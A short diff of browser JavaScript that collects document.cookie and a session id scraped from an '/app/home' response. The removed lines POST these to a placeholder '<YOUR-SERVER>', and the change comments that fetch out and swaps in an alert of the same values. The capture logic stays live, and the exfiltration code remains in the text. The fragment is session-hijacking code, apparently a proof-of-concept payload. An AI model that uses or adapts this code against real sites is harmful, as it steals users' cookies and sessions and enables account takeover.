@@ -17,16 +17,16 @@
                 const sid = part[1].split('\\\",\\\"single_types')
                 const cookie = document.cookie
                 const result = `${cookie};sid=${sid[0]}`;
-                // alert(result);
-                (async () => {
-                    const rawResponse = await fetch('<YOUR-SERVER>', {
-                        method: 'POST',
-                        body: result
-                    });
-                    const content = await rawResponse.json();
+                alert(result);
+                // (async () => {
+                //     const rawResponse = await fetch('<YOUR-SERVER>', {
+                //         method: 'POST',
+                //         body: result
+                //     });
+                //     const content = await rawResponse.json();
 
-                    console.log(content);
-                })();
+                //     console.log(content);
+                // })();
             }
         }
         xhr.open('GET', '/app/home', true);
